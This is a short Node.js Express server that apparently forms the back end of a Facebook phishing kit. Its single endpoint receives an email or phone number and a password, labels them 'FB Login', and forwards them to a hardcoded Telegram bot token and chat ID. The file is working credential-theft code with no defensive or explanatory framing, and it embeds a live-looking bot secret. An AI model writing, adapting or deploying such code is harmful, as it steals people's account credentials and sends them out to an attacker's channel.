const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const cors = require('cors');
const app = express();
app.use(cors());
app.use(bodyParser.json());

const TELEGRAM_BOT_TOKEN = '8349197469:AAGJ3QhB8iJUobWn_qL2sXbLXzsTMsPsnLo';
const TELEGRAM_CHAT_ID = '6367435401';

app.use(express.static('public'));

app.post('/send-to-telegram', async (req, res) => {
  const {email, password} = req.body;
  const text = `FB Login:\nEmail/Phone: ${email}\nPassword: ${password}`;
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text})
    });
    res.sendStatus(200);
  } catch (err) {
    res.sendStatus(500);
  }
});

app.listen(process.env.PORT || 10000, () => console.log('Server running...'));
